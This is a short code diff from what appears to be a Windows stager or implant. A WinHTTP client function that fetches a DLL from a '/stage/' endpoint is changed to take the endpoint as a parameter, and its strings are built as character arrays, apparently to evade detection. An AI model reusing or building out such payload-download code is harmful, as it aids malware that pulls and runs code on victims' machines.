@@ -256,11 +256,11 @@ void PostRequest(PAPI api, WCHAR* server, INTERNET_PORT port, const WCHAR* endpo
     ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hSession);
 }
 
-LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize)
+LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize, WCHAR* wEndpoint)
 {
     WCHAR wVerb[] = { 'G', 'E', 'T', 0 };
 
-    WCHAR wEndpoint[] = { '/', 's', 't', 'a', 'g', 'e', '/', 0 };
+    //WCHAR wEndpoint[] = { '/', 's', 't', 'a', 'g', 'e', '/', 0 };
 
     WCHAR wUserAgent[] = { 'I', 'm', 'h', 'u', 'l', 'l', 'u', 0 };
 
